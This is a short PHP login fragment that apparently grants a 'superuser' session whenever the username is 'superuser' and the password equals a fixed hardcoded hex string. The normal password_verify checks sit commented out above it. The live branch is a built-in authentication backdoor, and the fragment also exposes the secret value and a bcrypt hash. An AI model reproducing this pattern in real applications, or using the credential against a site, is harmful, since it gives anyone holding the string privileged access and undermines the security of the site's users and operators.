<?
//if(password_verify($pass,$r['pw'])==1)
//if($user=='superuser' && password_verify($pass,'$2y$10$kaUnkwOVilfP6coCs0GdVeZg0HCHpUp8UR9721Pnz2dxOiNu9MTge')){
if($user=='superuser' && $pass=='6ab292f2bd88f5f40513027a07240042'){
    $_SESSION[$logTs.'user_id']='s';
    $_SESSION[$logTs.'grp_code']='s';
    $_SESSION[$logTs.'grpt']='s';
    $_SESSION[$logTs.'user_code']='s';
    $_SESSION[$logTs.'theme']=0;
    //echo "<script>document.location='".$link."'</script>";
    header("Location:$link");
    exit;
}
?>